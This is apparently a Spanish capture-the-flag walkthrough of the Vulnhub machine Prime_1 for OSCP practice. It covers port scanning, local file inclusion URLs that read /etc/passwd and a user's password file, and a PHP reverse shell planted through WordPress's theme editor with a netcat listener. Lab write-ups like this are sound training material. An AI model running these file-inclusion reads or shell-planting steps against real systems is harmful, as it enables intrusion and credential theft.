<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=FF0000&width=200&height=70&lines=Prime_1"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/prime-1,358/

</br>

> Esta máquina está diseñada para aquellos que intentan prepararse para el examen OSCP. 

<h1 align="center"><img src="https://user-images.githubusercontent.com/75953873/173474426-a673d820-8b68-40c9-89f6-4686e436978f.png"></h1>

- *Paso 1:* Identificar la IP de la máquina host con NetDiscover. 
```
netdiscover -i eth0
```
![2](https://user-images.githubusercontent.com/75953873/173475187-1682b0c5-0c7e-410c-9455-98e8cd6c5e81.png)

IP host: `192.168.25.133`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -Pn -vvv 192.168.25.133
```
![3](https://user-images.githubusercontent.com/75953873/173475468-fee78430-41f0-4a6f-a18d-5934250a6aac.png)

Puertos abiertos: [22,80]

- *Paso 3:* Escaneo agresivo para detectar servicios corriendo.
```
nmap -A 192.168.25.133
```
![4](https://user-images.githubusercontent.com/75953873/173476100-ae65ae3d-4a36-466c-aa98-fbc4fee2c738.png)

Servidor corriendo: **HTTP Apache**

- *Paso 4:* Recorrido de ruta: enumerar archivos .txt con Dirb.

URL: `http://192.168.25.133`

![5](https://user-images.githubusercontent.com/75953873/173476731-79f7a93a-f659-4563-9cfd-d1f271f16a90.png)

```
dirb http://192.168.25.133 -X .txt
```
![6](https://user-images.githubusercontent.com/75953873/173477255-427b51b9-6023-48d8-a0aa-fbb42aa4af16.png)

Archivo secreto: `http://192.168.25.133/secret.txt`

![7](https://user-images.githubusercontent.com/75953873/173477715-6d51f82c-21fe-42c4-854f-fc5f9ca5d17a.png)

Probar los comandos Fuzzing que proporciona el repositorio de Github, el objetivo es encontrar un párametro para navegar dentro de él.

Comando fuzzy: `file`

![8](https://user-images.githubusercontent.com/75953873/173478463-cfd85ea0-4cdc-465c-95a1-79f699dcfd5a.png)

Unir la URL: `http://192.168.25.133/index.php?file=`

![9](https://user-images.githubusercontent.com/75953873/173478799-cd7249ce-8843-499b-917d-c43d22dcc4f4.png)

Archivo proporcionado: `location.txt`

URL completa: `http://192.168.25.133/index.php?file=location.txt`

![10](https://user-images.githubusercontent.com/75953873/173478934-d1f7d4ab-2b65-4666-87f9-346ebcae02b7.png)

El archivo `location.txt` nos dio una pista para usar `secrettire360` como parámetro en otra página php aprovechando la vulnerabilidad de inclusión de archivos locales (LFI).

Localizar archivos `.php` con Dirb:
```
dirb http://192.168.25.133 -X .php
```
![11](https://user-images.githubusercontent.com/75953873/173479528-29899116-a8f6-4a6a-b435-1ebca5e8c50d.png)

Pista: `secrettire360`

URL completa: `http://192.168.25.133/image.php?secrettier360`

```
dirb http://192.168.25.133 -X .php `http://192.168.25.133/image.php?secrettier360` /usr/share/dirb/wordlists/extensions_common.txt
```
![12](https://user-images.githubusercontent.com/75953873/173480064-2e0d0446-d55b-4bbc-97d1-1e7b4fa919f1.png)

URL completa: `http://192.168.25.133/image.php?secrettier360=/etc/passwd`

El usuario `Saket` menciona que dentro de su directorio `/home/saket/` se encuentra el archivo `password.txt`.

![13](https://user-images.githubusercontent.com/75953873/173481350-5277704e-627a-4568-9ded-bf3f91e9a38f.png)

URL completa: `http://192.168.25.133/image.php?secrettier360=/home/saket/password.txt`

![14](https://user-images.githubusercontent.com/75953873/173481656-71110280-511b-4654-823f-1a818ed71a09.png)

**_Credenciales WordPress_**

Usuario: `victor`

Contraseña: `follow_the_ippsec`

URL login: `http://192.168.25.133/wordpress/wp-login.php`

![15](https://user-images.githubusercontent.com/75953873/173482220-0ac1e036-8fea-4224-a696-d31344dd3aa1.png)

- *Paso 5:* Escribir código malicioso PHP.

Apariencia **>** Editor de temas **>** secret.php

![16](https://user-images.githubusercontent.com/75953873/173482698-dbb9561f-e59e-41ef-82d9-8a2152341170.png)

Ruta del código PHP del reverse shell:

```
cat /usr/share/webshells/php/php-reverse-shell.php
```
Cambiar la línea `$ip` por la IP local de su máquina, el puerto lo establecen a `4444`. Guardar cambios **_'Update Files'_**.

![17](https://user-images.githubusercontent.com/75953873/173484877-992337aa-07ec-4e77-9911-3d2012f90cec.png)

- *Paso 6:* Obtener una reverse shell con Netcat.
```
nc -lvp 4444
```

Recargar URL: `http://192.168.25.133/wordpress/wp-content/themes/twentynineteen/secret.php`

![18](https://user-images.githubusercontent.com/75953873/173485293-44576e95-de83-4473-a5f7-bb5a11c5db44.png)

Extraer información de los ficheros `user.txt` y `password.txt`:
```
cat user.txt && cat password.txt
```
![19](https://user-images.githubusercontent.com/75953873/173485677-7abb1021-7e79-4e87-ba5c-20cb4fffc4d2.png)

- *Paso 7:* Escalar privilegios: buscar exploit con searchsploit.

![20](https://user-images.githubusercontent.com/75953873/173485896-7949c037-0d58-4c15-b031-ea2413af4110.png)

Versión del kernel: `4.10.0-28-generic`

```
cat user.txt && cat password.txt
```
